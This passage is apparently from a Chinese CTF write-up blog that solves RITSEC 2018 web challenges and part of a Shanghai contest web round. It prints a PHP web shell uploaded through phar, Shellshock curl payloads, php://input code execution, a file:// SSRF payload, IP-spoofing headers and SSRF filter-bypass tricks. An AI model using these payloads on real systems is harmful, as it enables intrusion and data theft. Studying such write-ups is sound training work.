class="line">$filename = $_FILES[<span class="string">'upload'</span>][<span class="string">'name'</span>];</span><br><span class="line">$upload_time = time();</span><br><span class="line">$upload_dir = <span class="string">"uploads/"</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) . <span class="string">"/"</span>;</span><br><span class="line">$ext = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span> (strpos($filename, <span class="string">'.'</span>) !== <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">$f_ext = explode(<span class="string">"."</span>, $filename) [<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span> (ctype_alnum($f_ext) &amp;&amp; stripos($f_ext, <span class="string">"php"</span>) === <span class="keyword">false</span> &amp;&amp; stripos($f_ext, <span class="string">"pht"</span>) === <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">$ext = <span class="string">"."</span> . $f_ext;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$ext = <span class="string">".dat"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$ext = <span class="string">".dat"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$upload_path = $upload_dir . md5($upload_time) . $ext;</span><br><span class="line">mkdir($upload_dir, <span class="number">0770</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// Enforce maximum of 10 files</span></span><br><span class="line">$dir = <span class="keyword">new</span> DirLister($upload_dir);</span><br><span class="line"><span class="keyword">if</span> ($dir-&gt;getCount() &gt;= <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">unlink($upload_dir . $dir-&gt;getOldestFile());</span><br><span class="line">&#125;</span><br><span class="line">move_uploaded_file($_FILES[<span class="string">'upload'</span>][<span class="string">'tmp_name'</span>], $upload_path);</span><br><span class="line">$key = $upload_time . $ext;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"</span>&gt;</span><br><span class="line">        &lt;script src=<span class="string">"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;style&gt;</span><br><span class="line">            body &#123;</span><br><span class="line">                padding-top: <span class="number">70</span>px;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">        .fineprint &#123;</span><br><span class="line">            font-size: <span class="number">2</span>px;</span><br><span class="line">            color: red;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav class="navbar navbar-inverse navbar-fixed-top"&gt;</span><br><span class="line">        &lt;div class="container"&gt;</span><br><span class="line">            &lt;div class="navbar-header"&gt;</span><br><span class="line">                &lt;a class="navbar-brand" href="/"&gt;Archivr&lt;/a&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id="navbar" class="collapse navbar-collapse"&gt;</span><br><span class="line">                &lt;ul class="nav navbar-nav"&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href=<span class="string">"index.php?page=home"</span>&gt;Home&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">                    &lt;li class="active"&gt;&lt;a href="index.php?page=upload"&gt;Upload&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">                    &lt;li&gt;&lt;a href=<span class="string">"index.php?page=download"</span>&gt;Download&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">                &lt;/ul&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line">    &lt;div class="container"&gt;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($key))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">            &lt;div class="alert alert-success" role="alert"&gt;</span><br><span class="line">                File uploaded! Retrieval key: &lt;strong&gt;<span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $key; <span class="meta">?&gt;</span>&lt;/strong&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">            &lt;h3&gt;File Upload&lt;/h3&gt;</span><br><span class="line">            &lt;form action=<span class="string">"index.php?page=upload"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">                &lt;div class="col-xs-4"&gt;</span><br><span class="line">                    &lt;div class="form-group"&gt;</span><br><span class="line">                        &lt;label <span class="keyword">for</span>=<span class="string">"upload"</span>&gt;Select a &amp;lt;<span class="number">5</span>KB file&lt;/label&gt;</span><br><span class="line">                        &lt;input type="file" class="form-control-file" id="upload" name="upload"&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div class="form-group"&gt;</span><br><span class="line">                        &lt;button type="submit" class="btn btn-primary"&gt;Upload&lt;/button&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>可以看到上传目录为</p><p><code>uploads/md5(REMOTE_ADDR)/md5(time()).ext</code></p><p>通过time（）函数（unix时间戳）计算出文件名</p><p>且是通过判断目录底下的文件数量超过10就unlink。（并非时间）</p><p>继续看download.php的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">"POST"</span>) &#123;</span><br><span class="line">    $key = $_POST[<span class="string">'key'</span>];</span><br><span class="line"><span class="keyword">if</span> (strpos($key, <span class="string">'.'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">    $key_parts = explode(<span class="string">"."</span>, $key);</span><br><span class="line">    $hashed_key = md5(intval($key_parts[<span class="number">0</span>])) . <span class="string">"."</span> . $key_parts[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    $path = <span class="string">"uploads/"</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) . <span class="string">"/"</span> . $hashed_key;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($path)) &#123;</span><br><span class="line">        header(<span class="string">"Content-Disposition: attachment; filename=\""</span> . $key . <span class="string">"\""</span>);</span><br><span class="line">        <span class="keyword">die</span>(file_get_contents($path));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $error = <span class="string">"File not found!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $error = <span class="string">"Invalid key!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到下载的路径名为访问ip及路径md5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$key_parts = explode(&quot;.&quot;, $key);</span><br><span class="line">$hashed_key = md5(intval($key_parts[0])) . &quot;.&quot; . $key_parts[1];</span><br><span class="line">//$key为upload的返回上传路径</span><br><span class="line">$upload_dir = &quot;uploads/&quot; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]) . &quot;/&quot;;</span><br></pre></td></tr></table></figure><p>home.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"classes.php.inc"</span>);</span><br><span class="line"><span class="keyword">include</span>((<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]) &amp;&amp; is_string($_GET[<span class="string">'page'</span>]) ? $_GET[<span class="string">'page'</span>] : <span class="string">"home"</span>) . <span class="string">".php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试访问上传目录<code>/uploads/md5(MY_PUBLIC_IP)/</code></p><p>但发现总是404，然后出了hint</p><blockquote><p><a href="https://en.wikipedia.org/wiki/Reverse_proxy" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Reverse_proxy</a></p></blockquote><p>发现无果，，然后膜了师傅们的思路</p><p>PS：因为题目环境都是一样的，在What a cute dog那题的curl可以发现remote ip为<code>10.0.10.254</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# curl -d &quot;&lt;?=phpinfo();?&gt;&quot; -X POST http://fun.ritsec.club:8007/devsrule.php?magic=php://input | grep &quot;REMOTE&quot;</span><br></pre></td></tr></table></figure><p><img src="23.png" alt="23"></p><p>通过访问此路径发现返回403forbidden，此路不通，但目录是存在的！</p><p><img src="20.png" alt="20"></p><p>然后发现题目是archivr，感觉就是phar协议绕过</p><p>参考链接</p><p><a href="http://php.net/manual/zh/wrappers.phar.php" target="_blank" rel="noopener">php：phar协议</a></p><p>通过上传shell.zip返回的$key，快速计算出访问路径，在文件还存在的时候（路径存在）通过phar进行getshell</p><p>计算脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key = <span class="string">"xxxxxxxxxx.zip"</span>;</span><br><span class="line">$key_parts = explode(<span class="string">"."</span>, $key);</span><br><span class="line">$hashed_key = md5(intval($key_parts[<span class="number">0</span>])) . <span class="string">"."</span> . $key_parts[<span class="number">1</span>];</span><br><span class="line">$path = <span class="string">"uploads/"</span> . md5(<span class="string">"10.0.10.254"</span>) . <span class="string">"/"</span> . $hashed_key;</span><br><span class="line"><span class="keyword">echo</span> $path;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传的shell，压缩为zip上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> shell_exec($_GET[<span class="string">'cmd'</span>].<span class="string">' 2&gt;&amp;1'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="21.png" alt="21"></p><p>读取到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RITSEC&#123;uns3r1al1z3_4LL_th3_th1ng5&#125;</span><br></pre></td></tr></table></figure><h2 id="What-a-cute-dog-350"><a href="#What-a-cute-dog-350" class="headerlink" title="What a cute dog!-350"></a>What a cute dog!-350</h2><blockquote><p>This dog is shockingly cute!</p><p>fun.ritsec.club:8008</p><p><em>Author: sandw1ch</em></p></blockquote><p><img src="26.png" alt="26"></p><p>查看源码发现有这样/cgi-bin/stats的一个东西</p><p><img src="25.png" alt="25"></p><p>发现是一个ruby的cve，编号2014-6271，</p><p><img src="22.png" alt="22"></p><p>参考链接</p><p><a href="https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29" target="_blank" rel="noopener">shellshock</a></p><p><a href="https://github.com/hmlio/vaas-cve-2014-6271" target="_blank" rel="noopener">vaas-cve-2014-6271</a></p><p>直接拿payload怼</p><p><img src="24.png" alt="24"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -H "user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c 'find / -name flag.txt;'" http://fun.ritsec.club:8008/cgi-bin/stats</span><br><span class="line"></span><br><span class="line">curl -H "user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c 'cat /opt/flag.txt;'" http://fun.ritsec.club:8008/cgi-bin/stats</span><br></pre></td></tr></table></figure><p>出flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RITSEC&#123;sh3ll_sh0cked_w0wz3rs&#125;</span><br></pre></td></tr></table></figure><h2 id="Lazy-Dev-400"><a href="#Lazy-Dev-400" class="headerlink" title="Lazy Dev-400"></a>Lazy Dev-400</h2><blockquote><p>fun.ritsec.club:8007</p><p><em>Author: jok3r</em></p><p>hint（继The Tangled Web）:</p></blockquote><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt;!-- REMOVE THIS NOTE LATER --&gt;</span><br><span class="line">&gt; &lt;!-- Getting remote access is so much work. Just do fancy things on devsrule.php --&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>根据hint提示到devsrule.php，返回</p><p><img src="27.png" alt="27"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Not what you input eh?</span><br><span class="line">This param is 'magic' man.</span><br></pre></td></tr></table></figure><p>尝试发送magic=1，flag，true等均无果，最后在php://input绕过进行命令执行，回显目录</p><p><img src="32.png" alt="32"></p><p><img src="31.png" alt="31"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">A.html</span><br><span class="line">AH.html</span><br><span class="line">AHA.html</span><br><span class="line">AHAAHAH.html</span><br><span class="line">AHH.html</span><br><span class="line">AHHHA.html</span><br><span class="line">AHHHHH.html</span><br><span class="line">Ah.html</span><br><span class="line">Ahhh.html</span><br><span class="line">Away.html</span><br><span class="line">Be.html</span><br><span class="line">Believe.html</span><br><span class="line">Call.html</span><br><span class="line">Can.html</span><br><span class="line">Eyes.html</span><br><span class="line">Feel.html</span><br><span class="line">Fireflies.html</span><br><span class="line">Fl4gggg1337.html</span><br><span class="line">Freedom.html</span><br><span class="line">From.html</span><br><span class="line">Gang.html</span><br><span class="line">Get.html</span><br><span class="line">Give.html</span><br><span class="line">Gonna.html</span><br><span class="line">Gucci.html</span><br><span class="line">Ha.html</span><br><span class="line">I.html</span><br><span class="line">If.html</span><br><span class="line">Is.html</span><br><span class="line">Its.html</span><br><span class="line">JokersSomeSortaHack</span><br><span class="line">Just.html</span><br><span class="line">Like.html</span><br><span class="line">Lot.html</span><br><span class="line">Love.html</span><br><span class="line">Me.html</span><br><span class="line">Million.html</span><br><span class="line">More.html</span><br><span class="line">Never.html</span><br><span class="line">Not.html</span><br><span class="line">Older.html</span><br><span class="line">Once.html</span><br><span class="line">Roll.html</span><br><span class="line">Somebody.html</span><br><span class="line">Stars.html</span><br><span class="line">Stronger.html</span><br><span class="line">Take.html</span><br><span class="line">Tell.html</span><br><span class="line">Ten.html</span><br><span class="line">The.html</span><br><span class="line">Theyll.html</span><br><span class="line">To.html</span><br><span class="line">Told.html</span><br><span class="line">Tonight.html</span><br><span class="line">Up.html</span><br><span class="line">Waving.html</span><br><span class="line">When.html</span><br><span class="line">Will.html</span><br><span class="line">World.html</span><br><span class="line">Would.html</span><br><span class="line">You.html</span><br><span class="line">Your.html</span><br><span class="line">devsrule.php</span><br><span class="line">images</span><br><span class="line">index.html</span><br></pre></td></tr></table></figure><p>本以为flag束手就擒，结果访问Fl4gggg1337.html</p><p><img src="29.png" alt="29"></p><p>最后在/etc/passwd下发现可疑的joker目录</p><p><img src="30.png" alt="30"></p><p><img src="28.png" alt="28"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RITSEC&#123;WOW_THAT_WAS_A_PAIN_IN_THE_INPUT&#125;</span><br></pre></td></tr></table></figure><p>参考链接</p><p><a href="http://php.net/manual/zh/wrappers.phar.php" target="_blank" rel="noopener">php：phar协议</a></p><p><a href="https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29" target="_blank" rel="noopener">shellshock</a></p><p><a href="https://github.com/hmlio/vaas-cve-2014-6271" target="_blank" rel="noopener">vaas-cve-2014-6271</a></p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">php://filter</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;自闭玩家上线。。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://zo1ro.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>第四届上海大学生网络安全大赛线上Web复盘</title>
    <link href="https://zo1ro.github.io/2018/11/05/shanghai/"/>
    <id>https://zo1ro.github.io/2018/11/05/shanghai/</id>
    <published>2018-11-05T15:03:30.000Z</published>
    <updated>2019-05-09T16:30:37.612Z</updated>
    
    <content type="html"><![CDATA[<p>最近复习网工有点小累，，有点小炸</p><p>日常复盘学习不能落~~</p><p>加油</p> <a id="more"></a><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><hr><p>源代码发现hint访问robots.txt有source.php，flag.php</p><p>访问source.php返回</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you need to login as admin!&lt;!-- post param  'admin' --&gt;</span><br></pre></td></tr></table></figure><p>POST:admin=1返回</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you need to login as admin!&lt;!-- post param  'admin' --&gt;only 127.0.0.1 can get the flag!!</span><br></pre></td></tr></table></figure><p>尝试各种IP头</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Contact: 127.0.0.1</span><br><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Real-IP: 127.0.0.1</span><br><span class="line">X-Client-IP: 127.0.0.1</span><br><span class="line">Referer: 127.0.0.1</span><br><span class="line">From: 127.0.0.1</span><br><span class="line">X-Wap-Profile: 127.0.0.1</span><br><span class="line">True-Client-IP: 127.0.0.1</span><br><span class="line">Client-IP: 127.0.0.1</span><br></pre></td></tr></table></figure><p>发现X-Client-IP: 127.0.0.1返回</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you need to login as admin!&lt;!-- post param  'admin' --&gt;you need post url: http://www.ichunqiu.com</span><br></pre></td></tr></table></figure><p>POST：admin=1&amp;url=<a href="http://www.ichunqiu.com返回" target="_blank" rel="noopener">http://www.ichunqiu.com返回</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you need to login as admin!&lt;!-- post param  'admin' --&gt;http://www.ichunqiu.com&lt;img src="download/409352793;img1.jpg"/&gt;</span><br></pre></td></tr></table></figure><p>可通过uri：download/409352793;img1.jpg访问<img src="1.png" alt></p><p>发现可通过file协议读取，构造payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin=1&amp;url=file://www.ichunqiu.com/../../../var/www/html/flag.php</span><br></pre></td></tr></table></figure><p><img src="2.png" alt></p><p>ssrf关键词</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">share</span><br><span class="line">wap</span><br><span class="line">url</span><br><span class="line">link</span><br><span class="line">src</span><br><span class="line">source</span><br><span class="line">target</span><br><span class="line">u</span><br><span class="line">3g</span><br><span class="line">display</span><br><span class="line">sourceURl</span><br><span class="line">imageURL</span><br><span class="line">domain</span><br></pre></td></tr></table></figure><p>存在过滤的时候可以试试以下姿势:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1、@</span><br><span class="line">`http://abc@127.0.0.1`</span><br><span class="line"></span><br><span class="line">2、添加端口号</span><br><span class="line">`http://127.0.0.1:8080`</span><br><span class="line"></span><br><span class="line">3、短地址</span><br><span class="line">`http://dwz.cn/11SMa`</span><br><span class="line"></span><br><span class="line">4、可以指向任意ip的域名：xip.io</span><br><span class="line">`10.0.0.1.xip.io  =  10.0.0.1`</span><br><span class="line">`www.10.0.0.1.xip.io  =  10.0.0.1`</span><br><span class="line">`mysite.10.0.0.1.xip.io  =  10.0.0.1`</span><br><span class="line">`foo.bar.10.0.0.1.xip.io  =  10.0.0.1`</span><br><span class="line"></span><br><span class="line">5、ip地址转换成进制来访问</span><br><span class="line">`115.239.210.26 ＝ 16373751032`</span><br></pre></td></tr></table></figure><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><hr><p><img src="3.png" alt></p><p>主页访问.index.php.swp发现源码，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi -r index.php//恢复index.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">        $str=preg_replace(<span class="string">"/[&lt;&gt;*;|?\n ]/"</span>,<span class="string">""</span>,$str);</span><br><span class="line">        $str=str_replace(<span class="string">'flag'</span>,<span class="string">''</span>,$str);</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;           </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo</span><span class="params">($host)</span></span>&#123;</span><br><span class="line">        system(<span class="string">"echo $host"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"echo"</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$first=<span class="string">'hi'</span>;</span><br><span class="line">$var=<span class="string">'var'</span>;</span><br><span class="line">$bbb=<span class="string">'bbb'</span>;</span><br><span class="line">$ccc=<span class="string">'ccc'</span>;</span><br><span class="line">$i=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">if</span>($i===<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $i++;</span><br><span class="line">            $$key = $value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($first===<span class="string">"doller"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    @parse_str($_GET[<span class="string">'a'</span>]);</span><br><span class="line">    <span class="keyword">if</span>($var===<span class="string">"give"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($bbb===<span class="string">"me"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>($ccc===<span class="string">"flag"</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;br&gt;welcome!&lt;br&gt;"</span>;</span><br><span class="line">                $come=@$_POST[<span class="string">'come'</span>];</span><br><span class="line">                unserialize($come); </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;<span class="keyword">echo</span> <span 